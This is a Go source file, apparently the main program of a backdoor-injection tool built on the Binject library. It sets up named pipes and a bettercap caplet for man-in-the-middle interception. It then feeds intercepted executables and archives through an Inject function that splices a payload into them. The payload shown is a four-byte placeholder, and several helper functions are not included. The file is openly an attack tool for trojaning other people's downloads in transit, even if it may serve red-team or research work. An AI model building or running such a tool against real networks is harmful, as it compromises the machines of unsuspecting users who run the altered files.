package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"runtime"

	"github.com/Binject/binjection/bj"
	"github.com/h2non/filetype"
)

func main() {
	cwd := ""
	testfile := ""
	outfile := ""
	dir, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}

	flag.StringVar(&cwd, "d", dir, "Working Directory")
	flag.StringVar(&testfile, "f", "", "File to inject (oneshot test mode)")
	flag.StringVar(&outfile, "o", "", "Output file (oneshot test mode)")
	flag.Parse()
	if outfile == "" {
		outfile = testfile + ".b"
	}

	if testfile != "" { // One-shot test mode
		f, err := os.Open(testfile)
		if err != nil {
			log.Fatal(err)
		}
		dry, err := ioutil.ReadAll(f)
		if err != nil {
			log.Fatal(err)
		}
		wet, err := Inject(dry)
		if err != nil {
			log.Fatal(err)
		}
		err = ioutil.WriteFile(outfile, wet, 0755)
		if err != nil {
			log.Fatal(err)
		}
		return
	}

	pipeName := ""
	if runtime.GOOS == "windows" {
		pipeName = `\\.\pipe\` + "bdf"
	} else {
		pipeName = filepath.Join(cwd, "bdf")
	}
	dryPipe := pipeName + "dry"
	wetPipe := pipeName + "wet"
	capletPath := filepath.Join(cwd, "binject.cap")

	if err := GenerateCaplet(capletPath); err != nil {
		log.Fatal(err)
	}
	if err := GenerateCapletScript(filepath.Join(cwd, "binject.js"), CapletScriptConfig{DryPipe: dryPipe, WetPipe: wetPipe}); err != nil {
		log.Fatal(err)
	}

	log.Printf("RUN THIS COMMAND in another terminal:\n\tbettercap -caplet %s\n", capletPath)

	go ListenPipeDry(dryPipe)
	ListenPipeWet(wetPipe)
}

// Inject a binary or archive
func Inject(dry []byte) (wet []byte, err error) {
	kind, _ := filetype.Match(dry)
	if kind == filetype.Unknown {
		return dry, nil // unknown file type, pass it on
	}

	fmt.Printf("File type: %s. MIME: %s\n", kind.Extension, kind.MIME.Value)

	config := &bj.BinjectConfig{CodeCaveMode: false}
	return bj.Binject(dry, []byte{0, 0, 0, 0}, config)
}
